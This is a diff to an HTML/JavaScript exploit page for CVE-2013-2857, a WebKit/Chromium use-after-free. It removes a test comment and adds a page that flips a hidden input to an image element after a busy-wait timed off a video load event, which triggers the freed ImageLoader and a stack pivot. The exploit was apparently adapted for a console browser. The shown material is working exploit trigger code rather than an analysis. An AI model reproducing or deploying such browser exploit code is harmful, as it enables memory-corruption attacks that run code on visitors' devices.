@@ -1,10 +1,5 @@
-
-<!--
-Tested on 5.5.1
-CVE-2013-2857
-Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
-Result: Bug is present, crash
--->
+<html>
+<head>
 <script>
 function UaF(a){
     var pivotAdress             = 17489356;
@@ -84,6 +79,19 @@ function UaF(a){
     //Use the new WebCore::ImageLoader & pivot !
     return 0;
 }
+function sleep(ms) {
+    var unixtime_ms = new Date().getTime();
+    while(new Date().getTime() < unixtime_ms + ms) {}
+    x.type='image';
+}
 </script>
 
-<input id="x" type="image" onerror="UaF(this);" src=""/>
+</head>
+<body>
+<input id="x" type="hidden" onerror="UaF(this);" src=""/>
+<video onloadstart="sleep(500)">
+  <source src="indexiine.mp4" type="video/mp4">
+</video>
+
+</body>
+</html>
